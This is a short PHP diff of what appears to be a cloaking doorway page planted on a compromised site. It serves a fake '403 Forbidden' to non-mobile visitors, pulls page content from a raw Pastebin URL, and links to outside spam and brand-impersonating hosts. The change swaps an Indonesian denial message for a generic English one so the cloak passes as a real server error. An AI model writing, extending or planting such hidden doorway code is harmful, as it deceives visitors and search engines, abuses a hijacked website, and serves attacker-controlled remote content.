@@ -8,7 +8,7 @@ if (isset($_GET['post'])) {
         // Jika bukan perangkat seluler, tampilkan halaman kosong atau pesan
         header("HTTP/1.1 403 Forbidden");
         echo "<h1>403 Forbidden</h1>";
-        echo "<p>Konten ini hanya dapat diakses dari perangkat seluler.</p>";
+        echo "<p>You don't have permission to access this resource.</p>";
         exit; // Hentikan eksekusi lebih lanjut
     }
     $filename = "https://pastebin.com/raw/mqCJTET3";
@@ -61,7 +61,7 @@ if (isset($_GET['post'])) {
   <link rel="manifest" href="https:https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
   <link rel="shortcut icon" href="https://crm.indopedia.co.id/wp-content/uploads/2023/06/cropped-logo-indopedia-2-Copy-180x180.png" />
   <link rel="canonical" href="https://crm.indopedia.co.id/<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?>" />
-  <link rel="amphtml" href="https://emaleiluu.top/all/?page=<?php echo isset($BRAND) ? $BRAND : 'Tidak Ditemukan'; ?>">
+  <link rel="amphtml" href="https://emaleiluu.top/all/?page=<?php echo isset($SMALLBRAND) ? $SMALLBRAND : 'Tidak Ditemukan'; ?>">
   <!-- start preload -->
   <link rel="preload" href="https://a1gate.co.kr/jp/aston-banner.jpg" as="image" />
   <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
